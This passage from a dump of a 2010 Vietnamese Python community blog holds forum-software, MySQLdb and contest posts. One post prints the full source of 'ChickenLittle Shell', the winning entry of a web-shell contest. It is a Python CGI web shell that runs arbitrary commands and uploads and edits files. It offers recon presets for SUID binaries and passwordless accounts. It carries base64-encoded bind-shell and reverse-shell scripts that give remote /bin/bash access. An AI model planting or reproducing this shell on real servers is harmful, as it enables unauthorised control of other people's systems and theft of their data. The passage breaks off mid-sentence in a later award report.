đến với cộng đồng. Giới thiệu Phần mềm Vithon Forum (gọi tắt là VF ) là một phần mềm tự do, mã mở, miễn phí với chức năng chính là một diễn đàn thảo luận tương tự như các gói phần mềm phpBB, punBB, pyForum. VF là một ứng dụng web được viết bằng ngôn ngữ Python theo mô hình WSGI. VF có thể được triển khai với các máy chủ hỗ trợ WSGI hay CGI ví dụ như Apache. VF có thể sử dụng nhiều hệ cơ sở dữ liệu quan hệ như SQLite, MySQL, Oracle. Tính năng VF có các tính năng nổi trội sau: Đơn giản VF chỉ thực hiện một công việc chính đó là lưu trữ và hiển thị các thảo luận của người dùng một cách tiện lợi nhất. VF không mong muốn trở thành một công cụ tích hợp thư điện tử, lịch cá nhân, danh sách công việc, nhắn tin, tán gẫu, v.v... Nhỏ gọn Vì chỉ phục vụ một số ít tác vụ cơ bản của một diễn đàn, toàn bộ chương trình VF (trừ các thư viện ngoài) chỉ chiếm khoảng 100 kilobyte dung lượng dĩa. An toàn VF được phát triển với các tính năng an ninh được đặt lên hàng đầu. Vì sự đơn giản và tính nhỏ gọn của VF nên chương trình được thiết kế ưu tiên sự an toàn hơn tính năng, và việc kiểm tra mã nguồn được thực hiện thường xuyên nhằm đảm bảo sự ưu tiên đó. Thuận tiện VF đề cao việc sử dụng các chuẩn mở như OpenID để việc sử dụng VF trở nên dễ dàng hơn cho người dùng. Bên canh đó, các tính năng thông thường mà người dùng đã quen thuộc ở các gói phần mềm khác cũng có mặt trong VF như BBCode. Tất cả chỉ nhằm một mục đích tạo ra môi trường thảo luận thuận tiện. Yêu cầu hệ thống Để triển khai VF, hệ thống sẽ cần một số ứng dụng và mô-đun sau: Python v2.5 trở lên. Mô-đun mako Mô-đun werkzeug Mô-đun sqlalchemy Mô-đun routes Mô-đun repoze.who.plugins.openid Mô-đun repoze.what.plugins.xml Mô-đun postmarkup Mô-đun unidecode Mô-đun zope.interface Các mô-đun này có thể được cài đặt bằng setuptools ( easy_install ) hoặc pip . Cài đặt Mã nguồn của VF có thể được tải về từ địa chỉ http://bitbucket.org/vithon/vithon-forum . Giải nén mã nguồn vào một thư mục nào đấy, giả sử như /opt/vithon-forum . Dựa vào nội dung của tập tin config.py để tạo tập tin siteconfig.py mới, với các dòng lệnh gán giá trị phù hợp cho biến toàn cục. Các biến quan trọng cần thay đổi là COOKIE_SECRET , DATABASE_URL , STATIC_CONTENT_PATH , SESSION_STORAGE_PATH . Tập tin siteconfig.py có thể có dạng sau: BOARD_NAME = 'Acme Hideout' COOKIE_SECRET = 'y@h0O' DATABASE_URL = 'sqlite:////opt/vithon-forum/db.db' STATIC_CONTENT_PATH = '/opt/vithon-forum/static' SESSION_STORAGE_PATH = '/tmp/session' SESSION_COOKIE_NAME = 'sid' ENTRIES_PER_PAGE = 10 ORGANIZATION = 'Acme Corp' Sau đó, chúng ta cần phải khởi tạo cơ sở dữ liệu bằng lệnh initdb . $ cd /opt/vithon-forum $ python forum.py initdb Việc cài đặt đã hoàn tất. Vận hành Mặc dù cơ sở dữ liệu đã được khởi tạo khi cài đặt nhưng chúng ta chưa có dữ liệu nào trong cơ sở dữ liệu cả. Do đó, trước khi chạy VF, chúng ta sẽ cần phải tạo một số diễn đàn. Chúng ta sẽ sử dụng lệnh shell để thực hiện việc này. $ cd /opt/vithon-forum $ python forum.py shell Lệnh shell sẽ mở một phiên làm việc tương tác cho phép chúng ta sử dụng Python để tác động đến chương trình VF. Chúng ta sẽ nhập vào đoạn mã Python như sau. from model import * f1 = Forum ( u 'Forum 1' , u 'Dien giai cho Forum 1' ) f11 = Forum ( u 'Forum 1.1' , u 'Dien giai cho Forum 1.1' , f1 ) f12 = Forum ( u 'Forum 1.2' , u 'Dien giai cho Forum 1.2' , f1 ) f2 = Forum ( u 'Forum 2' , u 'Dien giai cho Forum 2' ) f21 = Forum ( u 'Forum 2.1' , u 'Dien giai cho Forum 2.1' , f2 ) f22 = Forum ( u 'Forum 2.2' , u 'Dien giai cho Forum 2.2' , f2 ) session . add ( f1 ) session . add ( f2 ) session . commit () Các câu lệnh trên tạo ra cấu trúc diễn đàn như sau: Forum 1 | +-- Forum 1.1 | +-- Forum 1.2 Forum 2 | +-- Forum 2.1 | +-- Forum 2.2 Vì VF không có các tính năng quản lý qua web nên lệnh shell cũng chính là môi trường quản lý chính. Cuối cùng, để chạy VF, chúng ta sẽ dùng lệnh runserver tương tự như sau: $ cd /opt/vithon-forum $ python forum.py runserver -h 127 .0.0.1 -p 8080 Khi này, nếu ta mở trình duyệt lên và đi đến trang http://127.0.0.1:8080 thì chúng ta sẽ thấy diễn đàn đã hoạt động. Triển khai theo mô hình CGI Chúng ta cũng có thể triển khai VF theo mô hình CGI. Đầu tiên chúng ta cần chép tập tin forum.cgi vào thư mục chứa các tập tin CGI (ví dụ như /var/www/cgi-bin ). Tiếp đến chúng ta cần sửa các lệnh thiết lập đường dẫn trong tập tin này cho phù hợp. # Set the path to store python package cache os . environ [ 'PYTHON_EGG_CACHE' ] = '/tmp/.egg' # Set the path to vithon forum here sys . path . insert ( 0 , '/opt/vithon-forum' ) Nếu như tập tin siteconfig.py nằm ở thư mục khác (ví dụ như trong thư mục /var/www/cgi-bin ), thì chúng ta cũng sẽ cần thêm vào các dòng bên dưới. Nếu siteconfig.py nằm chung chỗ với các tập tin khác của VF thì chúng ta không cần các dòng lệnh này. # Set the path to siteconfig.py here sys . path . insert ( 0 , '/var/www/cgi-bin' ) Và cuối cùng chúng ta chỉ cần cấu hình máy chủ web để sử dụng tập tin forum.cgi như là một ứng dụng CGI. Thông tin về vấn đề này được nói rõ hơn trong tài liệu đi kèm với máy chủ web.","tags":"Tin tức","title":"Giới thiệu phần mềm Vithon Forum"},{"url":"2010/06/dien-dan-vithon-hoat-dong-tro-lai.html","text":"Chào mọi người, sau một thời gian gián đoạn, diễn đàn Vithon đã hoạt động trở lại tại địa chỉ http://vithon.org/forum . Phiên bản mới của diễn đàn do chính các thành viên của nhóm PCNV phát triển, được viết hoàn toàn bằng ngôn ngữ Python. Mã nguồn của diễn đàn được host tại BitBuket . Hiện nay nhóm vẫn đang tiếp tục hoàn thiện các tính năng cơ bản và mở rộng cho diễn đàn. Chúng tôi chào đón mọi ý kiến đóng góp về tính năng sử dụng cũng như tham gia viết mã của tất cả các bạn.","tags":"Tin tức","title":"Diễn đàn vithon hoạt động trở lại"},{"url":"2010/06/ket-qua-cuoc-thi-giai-toan-bang-python.html","text":"Sau một tuần tranh tài sôi nổi, cuộc thi Giải Toán Bằng Python mừng ngày Quốc Tế Thiếu Nhi đã kết thúc tốt đẹp. Ngày 1/6, với sự tham dự của hầu hết các thí sinh và cổ động viên, anh Nguyễn Thành Nam - trưởng nhóm Python cho người Việt - đã tiến hành chấm bài. Đúng như dự đoán trong thời gian diễn ra kỳ thi của anh, mặc cho sự cạnh tranh rất quyết liệt giữa các thí sinh, vẫn có một bài thi tỏ ra vượt trội và giành chiến thắng một cách thuyết phục. Đó là bài dự thi của bạn Nhâm Xuân Nam, với nickname namnx. Với nội dung thi gần gũi, dễ tiếp cận nhưng cũng không kém phần hấp dẫn, cuộc thi đã thu hút sự tham gia đông đảo hơn rất nhiều so với hai cuộc thi trước. Chất lượng cuộc thi rất cao khi hầu hết các thí sinh đều tìm ra được công thức cho phép tính nhanh các cặp số, một số kỹ thuật về multi-processing cũng được các thí sinh tìm hiểu và tận dụng rất hiệu quả. Bài của bạn Nhâm Xuân Nam đã đạt được kết quả cách biệt với số n lớn nhất dài hơn 2100 chữ số! Nói về bài thi đoạt giải nhất, bạn Hoàng Quốc Thịnh - người đạt giải nhất cuộc thi đầu tiên - và anh Nguyễn Thành Nam đều chung một nhận định: Một bài thi chuẩn mực, không có gì phải phàn nàn cả! Mã nguồn của các bài dự thi cùng với chương trình chấm có thể được tải về tại đây . Hình sau là ảnh của lễ trao giải. Bạn Lê Ngọc Hiếu đại diện cho nhóm PCNV bên phải, trao tặng giải thưởng cho người chiến thắng bên trái. Một lần nữa xin chúc mừng bạn Nhâm Xuân Nam!","tags":"Tin tức","title":"Kết quả cuộc thi Giải Toán Bằng Python"},{"url":"2010/05/mysqldb-thiet-lap-ket-noi.html","text":"MySQLdb là một wrapper của thư viện MySQL C API: _mysql . Nó cho phép bạn viết các ứng dụng Python khả chuyển (portable) chạy trên nhiều môi trường khác nhau để truy cập vào máy chủ có hệ quản trị CSDL MySQL. Bài viết sau đây đề cập một số khía cạnh liên quan tới thiết lập kết nối CSDL. Đó là vấn đề quan trọng đầu tiên khi làm việc với bất kỳ hệ quản trị CSDL nào. Bản cài đặt MySQLdb có thể download trên trang: http://sourceforge.net/projects/mysql-python/ . Download có sẵn cho các nền tảng windows 32 bit và các họ unix. Đáng tiếc là MySQLdb hiện chỉ sử dụng cho các phiên bản python từ 2.3 đến 2.6. Hello World Giả thiết trên máy của bạn đã cài MySQL với cổng mặc định (3306) và account root không cần password. Đoạn chương trình sau minh họa một kết nối đơn giản nhất có thể. Nó in ra các db có trong CSDL này: >>> db = MySQLdb . connect ( user = \"root\" ) >>> cursor = db . cursor () >>> query = \"SHOW DATABASES\" >>> cursor . execute ( query ) 6L >>> cursor . fetchall () (('information_schema',), ('cdcol',), ('mysql',), ('phpmyadmin',), ('test',)) Kết nối theo IP Truy cập từ xa đến một hệ thống phức tạp hơn, bạn cần biết các tham số: Máy chủ chứa MySQL (mặc định: localhost hay 127.0.0.1 ) Cổng truy cập vào MySQL (mặc định: 3306) User, Password mà bạn được cấp Tên CSDL bạn muốn truy cập Ví dụ sau in ra các bảng của CSDL mydb trên máy 192.168.90.31 với cổng 3310: >>> db = MySQLdb . connect ( user = \"you\" , db = \"mydb\" , passwd = \"mypw\" , \\ host=\"192.168.90.31\", port=3310) >>> cursor = db . cursor () >>> query = \"SHOW TABLES\" >>> cursor . execute ( query ) >>> cursor . fetchall () Kết nối theo UNIX socket Trên các localhost cho phép dùng UNIX socket bạn có thể viết: db = MySQLdb.connect(db=\"test\", user=\"hoaiptm\", passwd=\"hoaiptm\", \\ unix_socket=\"/opt/hoaiptm/mysql/mysql.sock\") Truy cập MySQL qua các socket trên unix tương tự như named pipe trên windows. Nó cho phép các ứng dụng localhost tạo các kết nối cực kỳ nhanh đến CSDL. Nếu bạn chưa hiểu rõ về socket bạn có thể đọc: http://beej.us/guide/bgipc/output/html/multipage/unixsock.html . Giấu password Các ví dụ trên đây đều yêu cầu phải có password đặt trong mã nguồn Python. MySQLdb cho phép bạn giấu chúng trong một nơi mà chỉ bạn được phép truy cập: db = MySQLdb.connect(db=\"yourdb\", read_default_file=\"/home/hoaiptm/mysql.ini\") tập tin options /home/hoaiptm/mysql.ini có thể có nội dung như sau: [client] port=3310 socket=/opt/hoaiptm/mysql/mysql.sock user=hoaiptm password=hoaiptm Hướng dẫn về các option này có thể đọc trong tài liệu: http://www.yellis.net/docs/mysql/manuel_Option_files.html#Option_files . Thay đổi charset mặc định Các kết nối trong các ví dụ trên sử dụng charset mặt định là latin1 , do đó bạn không lấy được các dữ liệu tiếng Việt. Chẳng hạn bạn tạo một bảng user với chartset utf8 trong CSDL test như sau: USE `test`; CREATE TABLE `user` ( `Id` int(11) NOT NULL AUTO_INCREMENT, `account` varchar(50) DEFAULT NULL, `fullname` varchar(255) DEFAULT NULL, PRIMARY KEY (`Id`) ) ENGINE=MyISAM AUTO_INCREMENT=3 **DEFAULT CHARSET=utf8** ROW_FORMAT=DYNAMIC; INSERT INTO `user` VALUES (1,'hoaiptm','Phạm Thị Minh Hoài'); INSERT INTO `user` VALUES (2,'trangnt','Ngô Thu Trang'); Sau đó cố gắng lấy dữ liệu từ bảng user: >>> db = MySQLdb . connect ( user = \"hoaiptm\" , db = \"test\" , passwd = \"hoaiptm\" , port = 3310 ) >>> cursor = db . cursor () >>> query = \"SELECT fullname FROM user\" >>> cursor . execute ( query ) 2L >>> cursor . fetchall () (('Ph?m Th? Minh Ho\\xe0i',), ('Ng\\xf4 Thu Trang',)) Các dấu ? cho thấy các ký tự utf8 đã không được truyền tải đúng. Để giải quyết vấn đề này chúng ta thêm tùy chọn charset = \"utf8\" trong connection: >>> db = MySQLdb . connect ( user = \"hoaiptm\" , db = \"test\" , passwd = \"hoaiptm\" , \\ port=3310, charset=\"utf8\") ... >>> cursor . fetchall () ((u'Ph\\u1ea1m Th\\u1ecb Minh Ho\\xe0i',), (u'Ng\\xf4 Thu Trang',)) Lúc này tất cả các dữ liệu trong trường text, char, varchar đều được trả về dạng unicode. Yêu cầu trả về từ điển MySQLdb cho phép trả về các kết quả dạng từ điển, để làm được điều đó bạn thêm tùy chọn cursorclass=MySQLdb.cursors.DictCursor . Ví dụ: >>> db = MySQLdb . connect ( user = \"hoaiptm\" , db = \"test\" , passwd = \"hoaiptm\" , port = 3310 , \\ charset=\"utf8\", cursorclass=MySQLdb.cursors.DictCursor) >>> cursor = db . cursor () >>> query = \"select * from user\" >>> cursor . execute ( query ) 2L >>> cursor . fetchall () ({'account': u'hoaiptm', 'fullname': u'Ph\\u1ea1m Th\\u1ecb Minh Ho\\xe0i', 'Id': 1L}, \\ {'account': u'trangnt', 'fullname': u'Ng\\xf4 Thu Trang', 'Id': 2L}) Chương trình sẽ chạy chậm đi chút xíu, nhưng bù lại kết quả trả về rất dễ sử dụng.","tags":"Bài viết","title":"MySQLdb - Thiết lập kết nối"},{"url":"2010/05/phat-dong-cuoc-thi-giai-toan-bang-python.html","text":"Sau thành công của 2 lần thi trước, nhóm PCNV tiếp tục phát động cuộc thi Giải Toán Bằng Python để chào mừng ngày quốc tề thiếu nhi đang đến rất gần. Đề thi rất đơn giản: Hãy dùng ngôn ngữ lập trình Python để tính toán và xuất ra các cặp số n và k thỏa mãn: 1 + 2 + ... + n = n + 1 + n + 2 + ... + n + k Input: Không có. Output: Standard Output. Output Format: In trên nhiều dòng, mỗi dòng là một cặp số n, k cách nhau bằng một hoặc nhiều khoảng trắng. Yêu cầu: Chỉ được dùng các module built-in. Không được in ra các giá trị n, k đã tính toán sẵn trước khi chương trình thực thi dưới bất kỳ hình thức nào. Chương trình sẽ được người chấm thực thi trong vòng 30 giây. Hết thời gian này, chương trình sẽ bị ngắt. Chương trình nào in ra được nhiều cặp số n, k nhất sẽ chiến thắng. Chương trình sẽ bị loại nếu in ra bất cứ cặp số n, k nào không chính xác. Thời hạn dự thi: Từ ngày hôm nay (24/05/2010) đến hết ngày 31/05/2010 . Bài dự thi xin gửi về địa chỉ email admin+frontpage@vithon.org (xin vui lòng bỏ +frontpage trước khi gửi), bạn có thể gửi nhiều lần trong trường hợp cải thiện được kết quả của mình. Chương trình được gửi cuối cùng sẽ được nhóm PCNV sử dụng để chấm điểm chung cuộc. Trong quá trình làm bài, nếu có nhu cầu trao đổi, đặt câu hỏi, hay chỉ đơn giản là muốn trò chuyện với những người bạn rất dễ thương trong nhóm PCNV, các bạn có thể tham gia phòng tán gẫu #vithon ở máy chủ irc.freenode.net . Đã là cuộc thi thì không thể thiếu giải thưởng, phần thưởng cho người thắng cuộc là 100.000 VND và một buổi trò chuyện thân mật với admin nhóm PCNV.","tags":"Tin tức","title":"Phát động cuộc thi Giải Toán Bằng Python"},{"url":"2010/05/chickenlittle-shell.html","text":"Nhân dịp kỷ niệm 120 năm ngày sinh lãnh tụ Hồ Chí Minh, nhóm PCNV xin gửi đến bạn đọc bài dự thi đạt giải nhất cuộc thi Web Shell Programming Contest kết thúc vào ngày 15 tháng 05 vừa qua. #!/usr/bin/python \"\"\" ChickenLittle Shell by Zep \"\"\" try : import cgitb ; cgitb . enable () except : pass import sys , cgi , os , base64 , subprocess from time import strftime from string import Template bind_port = \"\"\"aW1wb3J0IG9zLCBzeXMsIHNvY2tldCwgdGltZQpQT1JUID0gaW50KHN5cy5hcmd2WzFdKQpQVyA9 IHN5cy5hcmd2WzJdCnNvY2sgPSBzb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULHNvY2tldC5T T0NLX1NUUkVBTSkKc29jay5iaW5kKCgiMC4wLjAuMCIsUE9SVCkpCnNvY2subGlzdGVuKDUpClNI RUxMPSIvYmluL2Jhc2ggLWkiCndoaWxlIFRydWU6CiAgICB0cnk6CQogICAgICAgIChjb25uLGFk ZHIpID0gc29jay5hY2NlcHQoKQogICAgICAgIG9zLmR1cDIoY29ubi5maWxlbm8oKSwwKQogICAg ICAgIG9zLmR1cDIoY29ubi5maWxlbm8oKSwxKQogICAgICAgIG9zLmR1cDIoY29ubi5maWxlbm8o KSwyKQogICAgICAgIHByaW50ID4+IHN5cy5zdGRlcnIsICdQYXNzd29yZDogJywKICAgICAgICBw ID0gY29ubi5yZWN2KDEwMjQpCiAgICAgICAgcCA9IHAuc3RyaXAoKQogICAgICAgIGlmIHAgPT0g UFc6CiAgICAgICAgICAgIG9zLnN5c3RlbSgiL2Jpbi9iYXNoIC1pIikKICAgICAgICBlbHNlOgog ICAgICAgICAgICBwcmludCA+PiBzeXMuc3RkZXJyLCAiR28gdG8gaGVsbCIKICAgICAgICBjb25u LmNsb3NlKCkKICAgIGV4Y2VwdCBFeGNlcHRpb24sZTogIAogICAgICAgIHByaW50IGUKICAgICAg ICB0aW1lLnNsZWVwKDEpCg==\"\"\" back_connect = \"\"\"aW1wb3J0IHNvY2tldCwgb3MsIHN5cwpIT1NUID0gc3lzLmFyZ3ZbMV0KUE9SVCA9IGludChzeXMu YXJndlsyXSkKU0hFTEwgPSAiL2Jpbi9iYXNoIC1pIgpzb2NrID0gc29ja2V0LnNvY2tldChzb2Nr ZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pCnNvY2suY29ubmVjdCgoSE9TVCxQT1JUKSkK dHJ5OgogICAgb3MuZHVwMihzb2NrLmZpbGVubygpLCAwKQogICAgb3MuZHVwMihzb2NrLmZpbGVu bygpLCAxKQogICAgb3MuZHVwMihzb2NrLmZpbGVubygpLCAyKQogICAgb3Muc3lzdGVtKFNIRUxM KQpleGNlcHQgRXhjZXB0aW9uLGU6CiAgICBwcmludCBlCnNvY2suY2xvc2UoKQo=\"\"\" # HTML html = Template ( \"\"\" <html> <head> <title>ChickenLittle Shell</title> <meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\" /> <style> body { color:#fff; background-color:#585858; font-size:11px; } table { font-family: Verdana, Tahoma; font-size:11px; } tr { border: #D9D9D9 1px solid; } td { border: #D9D9D9 1px solid; } a { color: #fff; } input { background-color:#800000; color:#FFFFFF; font-family:Tahoma; font-size:8pt; } select { background-color:#800000; color:#FFFFFF; font-family:Tahoma; font-size:8pt; } textarea { background-color:#800000; color:#FFFFFF; font-family:Tahoma; font-size:8pt; } </style> </head> <body> <script type=\"text/javascript\"> function toggleEnviron() { if (document.getElementById('environ_table').style.display==\"none\") document.getElementById('environ_table').style.display=\"\"; else document.getElementById('environ_table').style.display=\"none\"; } </script> <center><h2>=== ChickenLittle Shell ===</h2></center> <a href=\"javascript:void(0)\" onclick=\"javascript:toggleEnviron()\">Show/Hide Environment variables</a> $environ_table <p /> <table width=\"100%\"> <tr><td> uname -a: $uname <br /> $uid </td></tr> </table> <p /> <div style=\"display:$edit_file_box_visibility\"> <b>Edit File:</b> <br /> <form method=\"POST\" action=\"?\"> <textarea name=\"file_content\" cols=\"200\" rows=\"30\" >$file_content</textarea> <input type=\"hidden\" value=\"$cur_dir\" size=\"50\" name=\"cur_dir\" /> <br /> <input type=\"hidden\" value=\"save_file\" size=\"50\" name=\"command\" /> <br /> <input type=\"hidden\" value=\"$file_name\" size=\"50\" name=\"file_name\" /> <br /> <input type=\"submit\" value=\"Save\"> </form> <p /> </div> <table width=\"100%\"> <tr> <td style=\"text-align:center\"> <b>:: Change Dir ::</b><br /> <form action=\"?\" method=\"POST\"> <input type=\"text\" value=\"$cur_dir\" size=\"50\" name=\"cur_dir\">&nbsp;<input type=\"submit\" value=\"Go\"> </form> </td> <td style=\"text-align:center\"> <b>:: Get File ::</b><br /> <form action=\"?\" method=\"POST\"> <input type=\"text\" value=\"$cur_dir\" size=\"50\" name=\"cur_dir\">&nbsp;<input type=\"submit\" value=\"Go\"> </form> </td> </tr> </table> <p /> <table width=\"100%\"> <tr> <td colspan=\"2\" style=\"text-align:center\"><b>$cur_dir</b></td> </tr> <tr> <td><pre>$list_files</pre></td> </tr> </table> <p /> <b>Result of command</b><br /> <table width=\"100%\"> <tr> <td> <textarea cols=\"200\" rows=\"10\">$command_result</textarea> </td> </tr> </table> <table width=\"100%\"> <tr> <td style=\"text-align:center\" width=\"50%\"> <b>:: Execute Command ::</b><br /> <form action=\"?\" method=\"POST\"> <input type=\"hidden\" value=\"$cur_dir\" size=\"50\" name=\"cur_dir\" /> <input type=\"text\" value=\"\" size=\"50\" name=\"command\">&nbsp;<input type=\"submit\" value=\"Execute\"> </form> </td> <td style=\"text-align:center\"> <b>:: Useful Commands ::</b><br /> <form action=\"?\" method=\"POST\"> <select name=\"command\"> <option value=\"uname -a\">Kernel version</option> <option value=\"w\">Logged in users</option> <option value=\"lastlog\">Last to connect</option> <option value=\"find /bin /usr/bin /usr/local/bin /sbin /usr/sbin /usr/local/sbin -perm -4000 2> /dev/null\">Suid bins</option> <option value=\"cut -d: -f1,2,3 /etc/passwd | grep ::\">USER WITHOUT PASSWORD!</option> <option value=\"find /etc/ -type f -perm -o+w 2> /dev/null\">Write in /etc/?</option> <option value=\"which wget curl w3m lynx\">Downloaders?</option> <option value=\"cat /proc/version /proc/cpuinfo\">CPUINFO</option> <option value=\"netstat -atup | grep IST\">Open ports</option> <option value=\"locate gcc\">gcc installed?</option> </select> <input type=\"hidden\" value=\"$cur_dir\" size=\"50\" name=\"cur_dir\" /> <input type=\"submit\" value=\"Go\" /> </form> </td> </tr> </table> <p /> <table width=\"100%\"> <tr> <td style=\"text-align:center\" width=\"50%\"> <b>:: Create Dir ::</b><br /> <form action=\"?\" method=\"POST\"> <input type=\"text\" value=\"$cur_dir\" size=\"50\" name=\"new_dir\">&nbsp;<input type=\"submit\" value=\"Create\"> <input type=\"hidden\" value=\"mkdir\" size=\"50\" name=\"command\" /> <input type=\"hidden\" value=\"$cur_dir\" size=\"50\" name=\"cur_dir\"> </form> </td> <td style=\"text-align:center\"> <b>:: Upload File ::</b><br /> <form action=\"?\" method=\"POST\" enctype=\"multipart/form-data\"> <input type=\"file\" name=\"file\">&nbsp;<input type=\"submit\" value=\"Upload\"> <input type=\"hidden\" value=\"upload\" size=\"50\" name=\"command\" /> <input type=\"hidden\" value=\"$cur_dir\" size=\"50\" name=\"cur_dir\"> </form> </td> </tr> </table> <p /> <table width=\"100%\"> <tr> <td style=\"text-align:center\" width=\"50%\"> <b>:: Search Text in Files ::</b><br /> <form action=\"?\" method=\"POST\"> <table width=\"100%\"> <tr> <td width=\"50%\" style=\"border:none;text-align:right\">Text: </td> <td style=\"border:none\"><input type=\"text\" value=\"\" size=\"30\" name=\"search_text\" /></td> </tr> <tr> <td width=\"50%\" style=\"border:none;text-align:right\">Directory: </td> <td style=\"border:none\"><input type=\"text\" value=\"$cur_dir\" size=\"30\" name=\"search_dir\" /></td> </tr> <tr> <td width=\"50%\" style=\"border:none;text-align:right\">Include File Pattern: </td> <td style=\"border:none\"><input type=\"text\" value=\"\" size=\"30\" name=\"include_pattern\" /></td> </tr> <tr> <td width=\"50%\" style=\"border:none;text-align:right\">Exclude File Pattern: </td> <td style=\"border:none\"><input type=\"text\" value=\"\" size=\"30\" name=\"exclude_pattern\" /></td> </tr> </table> <input type=\"submit\" value=\"Search\"> <input type=\"hidden\" value=\"search_text\" size=\"50\" name=\"command\" /> <input type=\"hidden\" value=\"$cur_dir\" size=\"50\" name=\"cur_dir\"> </form> </td> <td style=\"text-align:center;vertical-align:top\"> <b>:: Edit File ::</b><br /> <form action=\"?\" method=\"POST\"> <input type=\"hidden\" value=\"$cur_dir\" size=\"50\" name=\"cur_dir\" /> <input type=\"hidden\" value=\"edit_file\" size=\"50\" name=\"command\"> <input type=\"text\" value=\"$cur_dir\" size=\"50\" name=\"file_name\"> &nbsp;<input type=\"submit\" value=\"Edit\"> </form> </td> </tr> </table> <p /> <table width=\"100%\"> <tr> <td style=\"text-align:center\" width=\"50%\"> <b>:: Bind port to /bin/bash ::</b><br /> <form action=\"?\" method=\"POST\"> <table width=\"100%\"> <tr> <td width=\"50%\" style=\"border:none;text-align:right\">Port: </td> <td style=\"border:none\"><input type=\"text\" value=\"\" size=\"10\" name=\"port\" /></td> </tr> <tr> <td style=\"border:none;text-align:right\">Password: </td> <td style=\"border:none\"><input type=\"text\" value=\"\" size=\"10\" name=\"password\" /></td> </tr> </table> <input type=\"submit\" value=\"Bind\"> <input type=\"hidden\" value=\"bind_port\" size=\"50\" name=\"command\" /> <input type=\"hidden\" value=\"$cur_dir\" size=\"50\" name=\"cur_dir\"> </form> </td> <td style=\"text-align:center\" width=\"50%\"> <b>:: back-connect ::</b><br /> <form action=\"?\" method=\"POST\"> <table width=\"100%\"> <tr> <td width=\"50%\" style=\"border:none;text-align:right\">IP: </td> <td style=\"border:none\"><input type=\"text\" value=\"\" size=\"10\" name=\"ip\" /></td> </tr> <tr> <td style=\"border:none;text-align:right\">Port: </td> <td style=\"border:none\"><input type=\"text\" value=\"\" size=\"10\" name=\"port\" /></td> </tr> </table> <input type=\"submit\" value=\"Connect\"> <input type=\"hidden\" value=\"back_connect\" size=\"50\" name=\"command\" /> <input type=\"hidden\" value=\"$cur_dir\" size=\"50\" name=\"cur_dir\"> </form> </td> </tr> </table> <p /> <table width=\"100%\"> <tr> <td style=\"text-align:center\"><b>(.)(.) [ChickenLittle Shell by Zep] (.)(.)</b></td> </tr> </table> </body> </html> \"\"\" ) scriptname = \"\" if os . environ . has_key ( \"SCRIPT_NAME\" ): scriptname = os . environ [ \"SCRIPT_NAME\" ] def get_environ_table (): s = \"<table style= \\\" display:none \\\" id= \\\" environ_table \\\" >\" for k in os . environ : s += \"<tr><td> %s </td><td> %s </td></tr>\" % ( k , os . environ [ k ]) s += \"</table>\" return s def run_command ( command ): p = subprocess . Popen ( command , shell = True , stdin = subprocess . PIPE , stdout = subprocess . PIPE , stderr = subprocess . STDOUT , close_fds = True ) ( i , o ) = p . stdin , p . stdout return o . read () def get_param ( form , param , default = None ): if form . has_key ( param ): return form . getvalue ( param ) return default def can_write ( file_name ): try : f = open ( file_name , \"w\" ) f . close () return True except : return False def put_script ( base_name , encoded_script ): script = base64 . b64decode ( encoded_script ) i = 0 file_name = \"/tmp/\" + base_name + str ( i ) while not can_write ( file_name ): i += 1 file_name = \"/tmp/\" + base_name + str ( i ) f = open ( file_name , \"w\" ) f . write ( script ) f . close () return file_name def main (): print \"Content-type: text/html\" # header print # blank line form = cgi . FieldStorage () uname = run_command ( \"uname -a\" ) uid = run_command ( \"id\" ) cur_dir = get_param ( form , \"cur_dir\" , os . getcwd ()) if not os . path . exists ( cur_dir ): cur_dir = os . getcwd () os . chdir ( cur_dir ) command = get_param ( form , \"command\" ) command_result = \"\" file_content = \"\" file_name = \"\" edit_file_box_visibility = \"None\" if command == \"mkdir\" : new_dir = get_param ( form , \"new_dir\" ) command_result = run_command ( \"mkdir \" + new_dir ) elif command == \"upload\" : upload_file = form [ \"file\" ] try : f = open ( upload_file . filename , \"w\" ) while True : chunk = upload_file . file . read ( 1024 ) if not chunk : break f . write ( chunk ) f . close () except Exception , e : command_result = str ( e ) elif command == \"search_text\" : search_text = get_param ( form , \"search_text\" , \"\" ) search_dir = get_param ( form , \"search_dir\" , \".\" ) include_pattern = get_param ( form , \"include_pattern\" ) exclude_pattern = get_param ( form , \"exclude_pattern\" ) cmd = \"grep -ir \\\" %s \\\" %s \" % ( search_text , search_dir ) if include_pattern : cmd += \"--include= %s \" % include_pattern if exclude_pattern : cmd += \"--include= %s \" % exclude_pattern command_result = run_command ( cmd ) elif command == \"edit_file\" : file_name = get_param ( form , \"file_name\" ) try : f = open ( file_name , \"r\" ) file_content = f . read () f . close () edit_file_box_visibility = \"\" except : command_result = \"Cannot open file\" file_content = \"\" edit_file_box_visibility = \"None\" elif command == \"save_file\" : file_name = get_param ( form , \"file_name\" ) file_content = get_param ( form , \"file_content\" ) try : f = open ( file_name , \"w\" ) f . write ( file_content ) f . close () command_result = \"Successful\" except : command_result = \"Cannot write to file\" elif command == \"bind_port\" : port = get_param ( form , \"port\" ) password = get_param ( form , \"password\" ) file_name = put_script ( \"bp\" , bind_port ) pid = subprocess . Popen ([ \"python %s %s %s \" % ( file_name , port , password )], shell = True ) . pid command_result = \"Process ID : %d \" % pid elif command == \"back_connect\" : port = get_param ( form , \"port\" ) ip = get_param ( form , \"ip\" ) file_name = put_script ( \"bc\" , back_connect ) pid = subprocess . Popen ([ \"python %s %s %s \" % ( file_name , ip , port )], shell = True ) . pid command_result = \"Process ID : %d \" % pid elif command != None : command_result = run_command ( command ) list_files = run_command ( \"ls -alh \" + cur_dir ) print html . substitute ( environ_table = get_environ_table (), uname = uname , uid = uid , list_files = list_files , cur_dir = cur_dir , command_result = command_result , file_content = file_content , file_name = file_name , edit_file_box_visibility = edit_file_box_visibility ) if __name__ == '__main__' : main ()","tags":"Bài viết","title":"ChickenLittle Shell"},{"url":"2010/05/trao-giai-cuoc-thi-viet-webshell-bang-python.html","text":"Ngày 16/05/2010 tại quán cafe K&K đã diễn ra buổi lễ trao giải cho cuộc thi viết webshell bằng python. Tại buổi lễ, anh Nguyễn Thành Nam là trưởng nhóm Python cho người Việt đã trao giải nhất của cuộc thi cho bạn Phan Đắc Anh Huy với phần thưởng là 100.000 đồng. Hình: anh Nguyễn Thành Nam trao giải cho bạn Phan Đắc Anh Huy Cuộc thi lần này đã thu hút sự tham gia của nhiều bạn trẻ hơn so với cuộc thi viết game bằng Python lần trước. Theo anh Nam, chất lượng cuộc thi lần 